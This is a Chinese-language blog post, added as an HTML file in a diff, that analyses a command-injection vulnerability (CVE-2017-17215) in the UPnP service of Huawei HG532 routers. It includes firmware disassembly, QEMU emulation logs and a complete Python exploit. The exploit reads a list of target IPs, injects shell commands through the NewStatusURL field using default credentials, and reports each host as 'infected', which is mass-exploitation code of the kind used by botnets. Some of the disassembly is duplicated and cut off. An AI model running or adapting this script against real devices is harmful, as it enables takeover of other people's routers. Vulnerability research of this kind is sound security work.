@@ -1,0 +1,1256 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="prontosil" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="漏洞分析 这次出问题的点是upnp程序 123home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36]&amp;gt; file upnp upnp: ELF 32-bit MSB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华为路由器 H532G 漏洞分析">
+<meta property="og:url" content="https://prontosil.club/2019/09/20/华为路由器-H532G-漏洞分析/index.html">
+<meta property="og:site_name" content="prontosil">
+<meta property="og:description" content="漏洞分析 这次出问题的点是upnp程序 123home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36]&amp;gt; file upnp upnp: ELF 32-bit MSB">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://prontosil.club/ctfsmallbook/IOT/assets/poc-1568898827379.png">
+<meta property="og:image" content="https://prontosil.club/ctfsmallbook/IOT/assets/006daSSqgy1fyhykbu0axj30fw074dg9.jpg">
+<meta property="og:image" content="https://prontosil.club/ctfsmallbook/IOT/assets/1568899195225.png">
+<meta property="og:image" content="https://prontosil.club/ctfsmallbook/IOT/assets/1568899403542.png">
+<meta property="og:image" content="https://prontosil.club/ctfsmallbook/IOT/assets/1568899461104.png">
+<meta property="og:image" content="https://prontosil.club/ctfsmallbook/IOT/assets/1568899744970.png">
+<meta property="og:updated_time" content="2019-09-20T01:01:46.298Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="华为路由器 H532G 漏洞分析">
+<meta name="twitter:description" content="漏洞分析 这次出问题的点是upnp程序 123home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36]&amp;gt; file upnp upnp: ELF 32-bit MSB">
+<meta name="twitter:image" content="https://prontosil.club/ctfsmallbook/IOT/assets/poc-1568898827379.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":10,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://prontosil.club/2019/09/20/华为路由器-H532G-漏洞分析/">
+
+
+
+
+
+  <title>华为路由器 H532G 漏洞分析 | prontosil</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/xinyongpeng"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">prontosil</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/09/20/华为路由器-H532G-漏洞分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">华为路由器 H532G 漏洞分析</h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-20T08:43:54+08:00">
+                2019-09-20
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-09-20T09:01:46+08:00">
+                2019-09-20
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2>漏洞分析</h2>
+<p>这次出问题的点是<code>upnp</code>程序</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36]</span><br><span class="line">&gt; file upnp </span><br><span class="line">upnp: ELF 32-bit MSB  executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size</span><br></pre></td></tr></table></figure></p>
+<p>是MIPS32位大端格式</p>
+<blockquote>
+<p>UPnP 是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。</p>
+</blockquote>
+<p>丢到IDA中分析</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">LOAD:004074FC                 la      $a1, aNewstatusurl  # &quot;NewStatusURL&quot;</span><br><span class="line">LOAD:00407500                 move    $a2, $zero</span><br><span class="line">LOAD:00407504                 jalr    $t9 ; ATP_XML_GetChildNodeByName</span><br><span class="line">LOAD:00407508                 addiu   $a3, $sp, 0x24</span><br><span class="line">LOAD:0040750C                 lw      $gp, 0x18($sp)</span><br><span class="line">LOAD:00407510                 bnez    $v0, loc_407564</span><br><span class="line">LOAD:00407514                 move    $s1, $v0</span><br><span class="line">LOAD:00407518                 lw      $v0, 0x24($sp)</span><br><span class="line">LOAD:0040751C                 nop</span><br><span class="line">LOAD:00407520                 beqz    $v0, loc_407564</span><br><span class="line">LOAD:00407524                 addiu   $s0, $sp, 0x28</span><br><span class="line">LOAD:00407528                 la      $t9, snprintf</span><br><span class="line">LOAD:0040752C                 lw      $a3, 0x20($sp)</span><br><span class="line">LOAD:00407530                 la      $a2, aUpgGUST1Firmwa  # &quot;upg -g -U %s -t &apos;1 Firmware Upgrade Ima&quot;...</span><br><span class="line">LOAD:00407538                 move    $a0, $s0</span><br><span class="line">LOAD:0040753C                 li      $a1, 0x400</span><br><span class="line">LOAD:00407540                 jalr    $t9 ; snprintf</span><br><span class="line">LOAD:00407544                 sw      $v0, 0x10($sp)</span><br><span class="line">LOAD:00407548                 lw      $gp, 0x18($sp)</span><br><span class="line">LOAD:0040754C                 nop</span><br><span class="line">OAD:00407520                 beqz    $v0, loc_407564</span><br><span class="line">LOAD:00407524                 addiu   $s0, $sp, 0x28</span><br><span class="line">LOAD:00407528                 la      $t9, snprintf</span><br><span class="line">LOAD:0040752C                 lw      $a3, 0x20($sp)</span><br><span class="line">LOAD:00407530                 la      $a2, aUpgGUST1Firmwa  # &quot;upg -g -U %s -t &apos;1 Firmware Upgrade Ima&quot;...</span><br><span class="line">LOAD:00407538                 move    $a0, $s0</span><br><span class="line">LOAD:0040753C                 li      $a1, 0x400</span><br><span class="line">LOAD:00407540                 jalr    $t9 ; snprintf</span><br><span class="line">LOAD:00407544                 sw      $v0, 0x10($sp)</span><br><span class="line">LOAD:00407548                 lw      $gp, 0x18($sp)</span><br><span class="line">LOAD:0040754C                 nop</span><br><span class="line">LOAD:00407550                 la      $t9, system #执行system</span><br></pre></td></tr></table></figure></p>
+<p>分析upnp描述信息后 发现该设备支持名为<code>DeviceUpgrade</code>的一种服务类型 设备可以通过这种服务更新固件 具体过程是向<code>“/ctrlt/DeviceUpgrade_1”</code>这个地址提交请求 请求中包含NewStatusURL及NewDownloadURL两个元素。
+远程管理员可以通过该漏洞在设备上执行任意命令 将shell元字符 注入NewStatusURL以及NewDownloadURL元素中</p>
+<p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/poc-1568898827379.png" alt="img"></p>
+<p>先调用了一个xml相关的函数，获取参数的值，很明显的看到了参数拼接的行为，之后调用了<code>system</code>函数</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snprintf($s0, 0x400, &apos;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&apos;, NewDownloadURL, NewStatusURL)</span><br><span class="line"></span><br><span class="line">system($s0)</span><br></pre></td></tr></table></figure></p>
+<p>不过还有一个认证机制需要 <code>Authorization</code> 头 才能过掉 <code>check</code>, 否则会 <code>401</code></p>
+<p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/006daSSqgy1fyhykbu0axj30fw074dg9.jpg" alt="img"></p>
+<h2>实际测试</h2>
+<p><a href="https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar" target="_blank" rel="noopener">路由器下载地址</a></p>
+<p>尝试直接运行脚本失败了</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ml-vm:/home/oit/tools/fat# ./sources/extractor/extractor.py -b iot -sql 127.0.0.1 -np -nk &quot;./HG532e.rar&quot; images</span><br><span class="line">-----------------Extractor Start----------------</span><br><span class="line">input:./HG532e.rar</span><br><span class="line">output:images</span><br><span class="line">rootfs:True</span><br><span class="line">kernel:False</span><br><span class="line">parallel:False</span><br><span class="line">sql:127.0.0.1</span><br><span class="line">brand:iot</span><br><span class="line">-----------------Extractor End------------------</span><br><span class="line">&gt;&gt; Database Image ID: 146</span><br><span class="line"></span><br><span class="line">/home/oit/tools/fat/HG532e.rar</span><br><span class="line">&gt;&gt; MD5: 9986b8aee8e1eb511a8bbb3a39b485e4</span><br><span class="line">&gt;&gt; Tag: 146</span><br><span class="line">&gt;&gt; Temp: /tmp/tmpLXreHs</span><br><span class="line">&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True</span><br><span class="line">&gt;&gt;&gt;&gt; RAR archive data, first volume type: MAIN_HEAD</span><br><span class="line">&gt;&gt; Recursing into archive ...</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 425, in extract</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 472, in _check_archive</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 693, in _check_recursive</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 381, in extract</span><br><span class="line">UnicodeDecodeError: &apos;ascii&apos; codec can&apos;t decode byte 0xd8 in position 37: ordinal not in range(128)</span><br><span class="line">&gt;&gt; Cleaning up /tmp/tmpLXreHs...</span><br></pre></td></tr></table></figure></p>
+<p>打算用qemu运行一个虚拟机来搞</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@ml-vm:/mnt/hgfs/IOTEXP/_router HG532e.rar.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted# sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=br0,script=no,downscript=no</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">[    0.000000] Linux version 2.6.32-5-4kc-malta (Debian 2.6.32-48squeeze4) (dannf@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 Tue Sep 24 00:02:22 UTC 2013</span><br><span class="line">[    0.000000] </span><br><span class="line">[    0.000000] LINUX started...</span><br><span class="line">[    0.000000] bootconsole [early0] enabled</span><br><span class="line">[    0.000000] CPU revision is: 00019300 (MIPS 24Kc)</span><br><span class="line">[    0.000000] FPU revision is: 00739300</span><br><span class="line">[    0.000000] Determined physical RAM map:</span><br><span class="line">[    0.000000]  memory: 00001000 @ 00000000 (reserved)</span><br><span class="line">...</span><br><span class="line">[    0.000000] SLUB: Genslabs=7, HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1</span><br><span class="line">[    0.000000] Hierarchical RCU implementation.</span><br><span class="line">[    0.000000] NR_IRQS:256</span><br><span class="line">[    0.000000] CPU frequency 200.00 MHz</span><br><span class="line">[    0.000000] Console: colour dummy device 80x25</span><br><span class="line">[    0.000000] console [tty0] enabled, bootconsole disabled</span><br></pre></td></tr></table></figure></p>
+<p>但是一直没有打开shell</p>
+<p><a href="https://people.debian.org/~aurel32/qemu/mips/" target="_blank" rel="noopener">ebian mips qemu镜像</a></p>
+<p>换了一个磁盘和内核，成功地开启了虚拟机但是网络配置没有成功</p>
+<p>未完待续。。</p>
+<p>修改了一下<code>/etc/network/interfaces</code>成功了</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root  root@192.168.104.187:/root</span><br></pre></td></tr></table></figure></p>
+<p>文件拷贝进去</p>
+<p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899195225.png" alt="1568899195225"></p>
+<p>进入虚拟机之后开启服务</p>
+<p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899403542.png" alt="1568899403542"></p>
+<p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899461104.png" alt="1568899461104"></p>
+<p>exp</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, sys, time, random, socket, re, os, struct, array, requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth</span><br><span class="line">ips = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>).readlines()</span><br><span class="line">cmd = <span class="string">""</span> <span class="comment"># Your MIPS (SSHD)</span></span><br><span class="line">rm = <span class="string">"&lt;?xml version=\"1.0\" ?&gt;\n    &lt;s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;\n    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"&gt;\n    &lt;NewStatusURL&gt;$("</span> + cmd + <span class="string">")&lt;/NewStatusURL&gt;\n&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\n&lt;/u:Upgrade&gt;\n    &lt;/s:Body&gt;\n    &lt;/s:Envelope&gt;"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exploit</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span> <span class="params">(self, ip)</span>:</span></span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self.ip = str(ip).rstrip(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + self.ip + <span class="string">":37215/ctrlt/DeviceUpgrade_1"</span></span><br><span class="line">                requests.post(url, timeout=<span class="number">5</span>, auth=HTTPDigestAuth(<span class="string">'dslf-config'</span>, <span class="string">'admin'</span>), data=rm)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[SOAP] Attempting to infect "</span> + self.ip</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n = exploit(ip)</span><br><span class="line">        n.start()</span><br><span class="line">        time.sleep(<span class="number">0.03</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+<p>确实成功了</p>
+<p>但是没有虚拟机上没有这个命令emmm</p>
+<p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899744970.png" alt="1568899744970"></p>
+<h2>参考</h2>
+<p><a href="https://paper.seebug.org/490/" target="_blank" rel="noopener">Huawei HG532 系列路由器远程命令执行漏洞分析</a></p>
+<p><a href="https://paper.seebug.org/490/" target="_blank" rel="noopener">CVE-2017-17215路由器漏洞分析</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/21/PHP-SSRF-Techniques-翻译/" rel="next" title="PHP SSRF Techniques">
+                <i class="fa fa-chevron-left"></i> PHP SSRF Techniques
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/24/thinkphp-rce分析/" rel="prev" title="thinkphp-rce分析">
+                thinkphp-rce分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+  <div id="gitalk-container"></div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="百浪多息">
+            
+              <p class="site-author-name" itemprop="name">百浪多息</p>
+              <p class="site-description motion-element" itemprop="description">还有很长的路要走</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">70</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">75</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xinyongpeng" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:xinyongp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/7b4cb9cdc0c8" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/he-yan-52-34/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.szfszf.top/" title="zsfnb!" target="_blank">zsfnb!</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://stackexit.cn/?tdsourcetag=s_pctim_aiomsg" title="xggnb!" target="_blank">xggnb!</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+         
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">实际测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">百浪多息</span>
+
+  
+</div>
+
+
+
+
+
+
